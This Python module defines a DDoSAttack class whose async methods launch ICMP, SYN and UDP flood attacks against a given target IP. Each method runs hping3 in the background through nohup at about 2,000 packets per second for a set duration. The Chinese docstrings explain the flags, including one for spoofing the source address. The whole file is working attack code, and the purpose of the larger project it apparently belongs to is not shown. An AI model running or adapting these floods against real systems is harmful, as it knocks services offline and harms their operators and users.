from ..command import execute_cmd_nowait
class DDoSAttack():
    def __init__(self):
        pass
    async def ddos_attack(self, target_ip,attack_type=None,duration = 10):
        if attack_type == "ICMP":
            return await self.icmp_flood(target_ip,duration)
        elif attack_type == "SYN":
            return await self.syn_flood(target_ip,duration)
        elif attack_type == "UDP":
            return await self.udp_flood(target_ip,duration)
        else:
            return False
    async def icmp_flood(self, target_ip,duration = 10):
        """
            --icmp ICMP包
            -q 安静
            -i 每个包的间隔时间(单位us): 500us-->每秒200个包(大概500kbps/s),持续时间5s(10000个包)
            -d 包大小(默认0),单位byte
            -c 包数量
            --rand-source 伪造源
        """
        totalPacketNum = int((1000000/500)*duration) #默认10000个包
        cmd = f"nohup hping3 --icmp -q -i u500  -c {totalPacketNum} {target_ip} > /dev/null 2>&1 &"
        execute_cmd_nowait(cmd)
        return True
    async def syn_flood(self, target_ip,duration = 10):
        """
            -S SYN包
        """
        totalPacketNum = int((1000000/500)*duration) 
        cmd = f"nohup hping3 -S -q -i u500 -c {totalPacketNum} {target_ip} > /dev/null 2>&1 &" 
        execute_cmd_nowait(cmd)
        return True
    async def udp_flood(self, target_ip, duration=10):
        """
            -u UDP包
        """
        totalPacketNum = int((1000000/500)*duration)
        cmd = f"nohup hping3 -u -q -i u500 -c {totalPacketNum} {target_ip} > /dev/null 2>&1 &"
        execute_cmd_nowait(cmd)
        return True